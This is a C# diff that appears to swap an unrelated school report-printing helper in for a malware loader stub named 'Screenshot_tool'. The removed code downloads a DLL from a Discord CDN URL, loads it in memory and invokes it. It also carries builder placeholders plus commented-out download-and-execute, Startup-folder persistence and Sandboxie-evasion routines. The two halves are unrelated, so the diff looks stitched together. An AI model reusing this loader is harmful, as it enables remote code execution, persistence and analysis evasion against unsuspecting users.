@@ -1,129 +1,113 @@
-/*
- * Created by SharpDevelop.
- * User: Myel
- * Date: 02/07/2014
- * Time: 11:24
- * 
- * To change this template use Tools | Options | Coding | Edit Standard Headers.
- */
+using School.DataAccess;
+using School.DataModel;
+using Microsoft.Reporting.WinForms;
 using System;
 using System.Collections.Generic;
-using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Drawing.Printing;
+using System.IO;
 using System.Linq;
-using System.Net;
-using System.Reflection;
-using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 
-//Default [assembly: AssemblyTitle("sourceid")]
-//Default [assembly: AssemblyDescription("sourceid")]
-//Default [assembly: AssemblyCompany("sourceid-sourceid sourceid")]
-//Default [assembly: AssemblyProduct("sourceid sourceid")]
-//Default [assembly: AssemblyCopyright("sourceid Copyright (C) 2021")]
-//Default [assembly: AssemblyFileVersion("1.1.3.0")]
-
-
-
-//Assembly [assembly: AssemblyTitle("{1}")]
-//Assembly [assembly: AssemblyDescription("{2}")]
-//Assembly [assembly: AssemblyCompany("{3}")]
-//Assembly [assembly: AssemblyProduct("{4}")]
-//Assembly [assembly: AssemblyCopyright("{5}")]
-//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
-
-namespace Screenshot_tool
+namespace School.Helpers
 {
-	/// <summary>
-	/// Class with program entry point.
-	/// </summary>
-	internal sealed class Program
-	{
-		/// <summary>
-		/// Program entry point.
-		/// </summary>
-		/// 
+    public class PrintFunction
+    {
+        private List<Stream> m_Streams { get; set; }
 
+        private int m_CurrentPageIndex { get; set; }
 
+        private Stream CreateStream(string p_Name,string p_FileNameExtension, Encoding p_Encoding,string p_MimeType, bool p_WillSeek)
+        {
+            Stream _Stream = new MemoryStream();
+            m_Streams.Add(_Stream);
+            return _Stream;
+        }
 
-		public static byte[] indirme(string filemanager)
-		{
-			byte[] indirme;
-			for (; ; )
-			{
-				try
-				{
-					WebClient numara = new WebClient();
-					indirme = numara.DownloadData(filemanager);
-				}
-				catch (Exception ex)
-				{
-					continue;
-				}
-				break;
-			}
-			return indirme;
-		}
+        public void Export(LocalReport p_Report)
+        {
+            string _DeviceInfo =
+              @"<DeviceInfo>
+                <OutputFormat>EMF</OutputFormat>
+                <PageWidth>8.5in</PageWidth>
+                <PageHeight>11in</PageHeight>
+                <MarginTop>0.25in</MarginTop>
+                <MarginLeft>0.25in</MarginLeft>
+                <MarginRight>0.25in</MarginRight>
+                <MarginBottom>0.25in</MarginBottom>
+            </DeviceInfo>";
 
-		[DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
+            PrintSettingService _PrintSettingService = new PrintSettingService();
 
-		private static extern int record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
-		[STAThread]
-		private static void Main(string[] args)
-		{
+            Result<PrintSettingMaster> _Result = _PrintSettingService.GetPrintSetting(Convert.ToString(Properties.Settings.Default.Year));
 
-			//sandboxie controlsandboxie();
+            if (_Result.IsSuccess)
+            {
+                if (_Result.Data != null)
+                {
+                    _DeviceInfo =
+                        @"<DeviceInfo>
+                        <OutputFormat>" + _Result.Data.OutPutFormat + "</OutputFormat>" +
+                          "<PageWidth>" + _Result.Data.PageWidth + "in</PageWidth>" +
+                          "<PageHeight>" + _Result.Data.PageHeight + "in</PageHeight>" +
+                          "<MarginTop>" + _Result.Data.MarginTop + "in</MarginTop>" +
+                          "<MarginLeft>" + _Result.Data.MarginLeft + "in</MarginLeft>" +
+                          "<MarginRight>" + _Result.Data.MarginRight + "in</MarginRight>" +
+                          "<MarginBottom>" + _Result.Data.MarginBottom + "in</MarginBottom>" +
+                          "</DeviceInfo>";
+                }
+            }
 
-			//Messega
+            Warning[] _Warnings;
+            m_Streams = new List<Stream>();
+            p_Report.Render("Image", _DeviceInfo, CreateStream,
+               out _Warnings);
+            foreach (Stream stream in m_Streams)
+                stream.Position = 0;
+        }
 
+        private void PrintPage(object sender, PrintPageEventArgs ev)
+        {
+            Metafile _PageImage = new
+               Metafile(m_Streams[m_CurrentPageIndex]);
 
-			//download try
-			//download {
-			//download  System.Net.WebClient appyrun = new System.Net.WebClient();
-			//download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
-			//download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
-			//download }
-			//download catch
-			//download {
-			//download }
-			{
-				ServicePointManager.Expect100Continue = true;
-				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
-			}
+            // Adjust rectangular area with printer margins.
+            Rectangle _AdjustedRect = new Rectangle(
+                ev.PageBounds.Left - (int)ev.PageSettings.HardMarginX,
+                ev.PageBounds.Top - (int)ev.PageSettings.HardMarginY,
+                ev.PageBounds.Width,
+                ev.PageBounds.Height);
 
+            // Draw a white background for the report
+            ev.Graphics.FillRectangle(Brushes.White, _AdjustedRect);
 
-			object resim = new object[] { %aPP%, string.Empty, indirme("%Server%"), true };
+            // Draw the report content
+            ev.Graphics.DrawImage(_PageImage, _AdjustedRect);
 
+            // Prepare for the next page. Make sure we haven't hit the end.
+            m_CurrentPageIndex++;
+            ev.HasMorePages = (m_CurrentPageIndex < m_Streams.Count);
+        }
 
-			ServicePointManager.Expect100Continue = true;
+        public void Print()
+        {
+            if (m_Streams == null || m_Streams.Count == 0)
+                throw new Exception("Error: no stream to print.");
 
+            PrintDocument _PrintDoc = new PrintDocument();
 
-			Assembly maymun;
-
-			maymun = AppDomain.CurrentDomain.Load(indirme("https://cdn.discordapp.com/attachments/849222618649591812/849222637179371520/TextEditor.dll"));
-
-
-			maymun.GetType("TextEditor.Home").InvokeMember("sourcecodester", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])resim);
-
-
-			//start  {
-			//start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
-			//start  }
-
-
-		}
-
-
-
-		//sandboxie [DllImport("kernel32.dll")]
-		//sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
-		//sandboxie static void controlsandboxie()
-		//sandboxie {
-		//sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
-		//sandboxie     {
-		//sandboxie        Environment.Exit(1);
-		//sandboxie     }
-		//sandboxie }
-
-	}
+            if (!_PrintDoc.PrinterSettings.IsValid)
+            {
+                throw new Exception("Error: cannot find the default printer.");
+            }
+            else
+            {
+                _PrintDoc.PrintPage += new PrintPageEventHandler(PrintPage);
+                m_CurrentPageIndex = 0;
+                _PrintDoc.Print();
+            }
+        }
+    }
 }
